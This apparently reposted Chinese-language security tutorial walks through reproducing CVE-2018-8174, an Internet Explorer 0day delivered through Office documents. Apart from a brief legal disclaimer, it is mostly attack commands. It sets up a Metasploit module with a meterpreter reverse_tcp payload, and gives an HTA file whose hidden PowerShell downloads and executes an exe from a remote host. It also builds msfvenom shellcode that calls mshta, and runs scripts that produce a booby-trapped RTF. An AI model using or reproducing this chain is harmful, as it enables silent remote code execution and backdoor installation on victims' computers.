***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **最近360核心安全事业部高级威胁应对团队在全球范围内率先监控到了一例使用0day漏洞的APT攻击，捕获到了全球首例利用浏览器**
**0day漏洞的新型Office文档攻击，我们将该漏洞命名为“双杀”漏洞。该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门木马完全控制电脑。**

了解更多 <http://www.freebuf.com/articles/paper/171254.html>

## POC验证

未打补丁系统，IE浏览器打开此地址会弹出计算器 。

<http://test.lr3800.com/CVE-2018-8174_PoC.html>

![bb5e6176bf9a67200484199680e96f87.png](https://image.3001.net/images/20180604/15281226592968.png!small)

## metasploit 复现

下载 metasploit 模块到本地

    
    
    git clone https://github.com/0x09AL/CVE-2018-8174-msf.git

将CVE-2018-8174.rb复制到 fileformat 目录

    
    
    cp CVE-2018-8174.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/

将CVE-2018-8174.rtf复制到 exploits 目录

    
    
    cp CVE-2018-8174.rtf /usr/share/metasploit-framework/data/exploits/

启动 metasploit

    
    
    use exploit/windows/fileformat/CVE-2018-8174
    set PAYLOAD windows/meterpreter/reverse_tcp
    set srvhost 192.168.0.116
    set lhost 192.168.0.116
    exploit  
    

![58858df35a658d45a4a39cda1c0cde40.png](https://image.3001.net/images/20180604/15281226764863.png!small)复制
/root/.msf4/local/目录中的 msf.rtf 文件到目标主机上使用word文档打开  
或者IE浏览器打开 <http://192.168.0.116:8080> 即可获得会话

## 自定义下载者 复现

利用 mshta 从远程服务器下载文件执行。

请先下载poc附件，下文中使用 链接：<https://pan.baidu.com/s/14vP4CMdjEKkRdHBb7vLSHg> 密码：ci8h

1.构造HTA文件，当访问hta文件就会触发powershell下载文件至临时目录执行

准备你的xx.exe文件上传至站点目录，假如得到地址 <http://xxx.com/xxx.exe>

![802a8dd6ffc42f58a9cc3b6c6b1b41cf.png](https://image.3001.net/images/20180604/15281226954786.png!small)HTA代码：

    
    
    <script>
    a=new ActiveXObject("WScript.Shell");
    a.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://xxx.com/xxx.exe\', \'c:/windows/temp/xxx.exe\'); c:/windows/temp/xxx.exe', 0);window.close();
    </script>  
    

把该文件命名 8174.hta 上传至站点目录；假如得到地址 <http://xxx.lr3800.com/8174.hta>

2.使用msfvenom生成 js Shellcode

    
    
    msfvenom -p windows/exec cmd='mshta http://xxx.lr3800.com/8174.hta' -f js_le exitfunc=thread -a x86

![001a4a295242e809c0878a68eec4e91a.png](https://image.3001.net/images/20180604/15281227423616.png!small)把生成的Shellcode字符替换至
8174poc.html 166行代码

![46cdbb714b067c132fda956e3e515c64.png](https://image.3001.net/images/20180604/15281227682327.png!small)![6f1673bcee0fcab7a38d7545e77240c0.png](https://image.3001.net/images/20180604/15281227855191.png!small)把
8174poc.html 文件上传至站点目录 假如得到地址 <http://xxx.lr3800.com/8174poc.html>

3.生成Word文档

* 下载python脚本保存本地
    
    
    git clone https://github.com/Yt1g3r/CVE-2018-8174_EXP.git

运行 CVE-2018-8174.py

    
    
    python CVE-2018-8174.py -u http://xxx.lr3800.com/8174poc.html -o exp.rtf

![6bd891b33bfdf6581e32ba199e229c4e.png](https://image.3001.net/images/20180604/1528122802451.png!small)得到目录中的
“exp.rtf ”文件，使用Word文档打开即可下载执行xx.exe文件，或者IE浏览器打开
<http://xxx.lr3800.com/8174poc.html> 即可下载执行xx.exe文件

样本演示运行效果 <https://app.any.run/tasks/3c52b2b2-3fb7-42ff-a3bf-14429b17b112>

